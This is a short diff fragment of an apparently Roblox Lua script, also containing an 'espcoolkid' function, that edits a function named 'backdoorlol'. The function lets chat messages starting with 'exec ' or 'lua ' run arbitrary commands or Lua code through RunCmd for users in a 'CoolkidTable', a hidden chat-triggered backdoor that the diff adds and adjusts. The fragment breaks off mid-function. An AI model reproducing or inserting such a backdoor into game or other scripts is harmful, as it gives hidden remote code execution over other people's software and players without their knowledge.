@@ -1629,8 +1629,8 @@ local function espcoolkid(Plr,Char)
 	end)
 end
 
-local function backdoorlol(Chat)
-if CoolkidTable[tostring(plr.UserId)] then return end
+local function backdoorlol(player,Chat)
+if CoolkidTable[tostring(player.UserId)] then return end
 	if Chat:sub(1,5) == "exec " then 
 		RunCmd(Chat:sub(6))
 	elseif Chat:sub(1,4) == "lua " then 
